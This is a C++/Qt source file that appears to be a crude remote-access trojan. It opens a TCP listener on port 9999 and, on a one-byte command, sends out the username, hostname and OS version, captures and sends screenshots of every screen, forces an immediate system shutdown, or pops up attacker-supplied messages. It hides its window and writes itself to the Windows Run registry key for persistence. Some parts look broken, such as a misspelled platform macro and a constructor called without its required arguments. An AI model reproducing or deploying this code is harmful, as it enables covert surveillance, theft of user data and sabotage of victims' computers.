#include "mainwindow.h"
#include "mytcpserver.h"
#include "mytcpclient.h"
#include <QApplication>
#include <QtCore/QCoreApplication>
#include <QApplication>
#include <QSysInfo>
#include <QTextStream>
#include <qhostinfo.h>
#include <qnetworkinterface.h>
#include <qtcpserver.h>
#include "mytcpserver.h"
#include <QPixmap>
#include <QDesktopWidget>
#include <QScreen>
#include <QPainter>
#include <qfile.h>
#include <QImage>
#include <QImageWriter>
#include <QByteArray>
#include <QBuffer>
#include <QProcess>
#include <QDir>
#include <QMessageBox>
#include <QSettings>
#include <QTcpSocket>

    using namespace std;

    QSysInfo systemInfo;
    QTextStream outp(stdout);

    QPixmap grabScreens() {
      auto screens = QGuiApplication::screens();
      QList<QPixmap> scrs;
      int w = 0, h = 0, p = 0;
      foreach (auto scr, screens) {
        QPixmap pix = scr->grabWindow(0);
        w += pix.width();
        if (h < pix.height()) h = pix.height();
        scrs << pix;
      }
      QPixmap final(w, h);
      QPainter painter(&final);
      final.fill(Qt::black);
      foreach (auto scr, scrs) {
        painter.drawPixmap(QPoint(p, 0), scr);
        p += scr.width();
      }
      return final;
    }

    TCPClient::TCPClient(QString hostname, int port)
    {
        socket = new QTcpSocket(this);

        connect(socket, SIGNAL(error(QAbstractSocket::SocketError)), this, SLOT(error(QAbstractSocket::SocketError)));
        connect(socket, SIGNAL(readyRead()), this, SLOT(read()));
        socket->connectToHost(hostname, port);
        socket->waitForConnected();
    }

    void TCPClient::error(QAbstractSocket::SocketError error){
        qDebug() << error;
    }

    void TCPClient::read(){
        qDebug() << "asd";
        qDebug() <<"new comment";
    }

    void TCPClient::write(QByteArray data){
        socket->write(data);
        socket->flush();
    }

    MyTcpServer::MyTcpServer(QObject *parent) :
        QObject(parent)
    {
        server = new QTcpServer(this);

        connect(server, SIGNAL(newConnection()),
                this, SLOT(newConnection()));

        if(!server->listen(QHostAddress::Any, 9999))
        {
            qDebug() << "Server could not start!";
        }
        else
        {
            qDebug() << "Server started!";
        }
    }

    void MyTcpServer::newConnection()
    {

        qDebug() << "New connection!";
        QTcpSocket *socket = server->nextPendingConnection();
        socket->waitForReadyRead();
        int type = (int)socket->read(1).toInt();
        QByteArray bArray;
        switch(type){
        case 1:{
            string form = qgetenv("USERNAME").toStdString()+"|"+systemInfo.machineHostName().toStdString()+"|"+systemInfo.prettyProductName().toStdString()+"|"+systemInfo.productVersion().toStdString();
            bArray = form.c_str();
            break;
        }
        case 2 :{
            QPixmap qwe = grabScreens();
            QBuffer buffer(&bArray);
            buffer.open(QIODevice::WriteOnly);
            qwe.save(&buffer, "PNG");
            bArray=bArray.toBase64();
            break;
        }
        case 3: {
                bArray="Good bye motherfucker";
                QProcess::startDetached("shutdown -s -f -t 0");
                break;
            }
        case 4: {
            string smth = socket->readAll();
            bArray = "sd";
                QMessageBox::information(0, "sooka", smth.c_str());
                break;
            }
        default:{
            qDebug() << "type of recieved data:";
            qDebug() << type;
            bArray=qgetenv("USERNAME");
            break;
            }
        }

        socket->write(bArray);
        socket->flush();
        socket->waitForBytesWritten(3000);

        socket->close();
    }


    int main(int argc, char *argv[])
    {
        QApplication a(argc, argv);
        qDebug() << "vot noviy project";
        #ifdef Q_QS_WIN32
            QSettings settings("HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CurrentVersion\\Run", QSettings::NativeFormat);
            settings.setValue(QApplication::applicationName(), QDir::toNativeSeparators(QApplication::applicationFilePath()));
            settings.sync();
        #endif
        MainWindow s;
        a.setQuitOnLastWindowClosed(false);
        TCPClient clie;
        MyTcpServer server;
        return a.exec();
    }
